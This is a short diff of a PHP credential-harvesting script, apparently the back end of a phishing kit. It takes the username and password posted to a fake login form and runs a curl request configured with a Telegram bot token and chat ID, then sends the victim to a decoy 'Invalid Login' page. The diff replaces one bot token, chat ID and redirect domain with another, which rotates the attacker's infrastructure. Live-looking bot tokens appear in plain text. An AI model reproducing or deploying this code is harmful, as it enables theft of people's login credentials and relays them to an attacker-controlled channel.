@@ -6,8 +6,8 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
 
 date_default_timezone_set('UTC');
 
-$botToken = '8093851911:AAEyrP0mC_P-G3OrO7yV8CG5jlfUp7Hp9qA';
-$chatId   = '5666631780';
+$botToken = '6627263483:AAG5WQX0ha9hsx740CwSUtkMjwDONp0Eh_w';
+$chatId   = '5248818941';
 
 $email = trim($_POST['username'] ?? '');
 $password = trim($_POST['password'] ?? '');
@@ -40,6 +40,6 @@ curl_exec($ch);
 curl_close($ch);
 
 // Redirect after success
-header("Location: https://authenticationform.rf.gd/cache_site/Invalid%20Login.php");
+header("Location: https://authenticationlive.rf.gd/cache_site/Invalid%20Login.php");
 exit;
 ?>
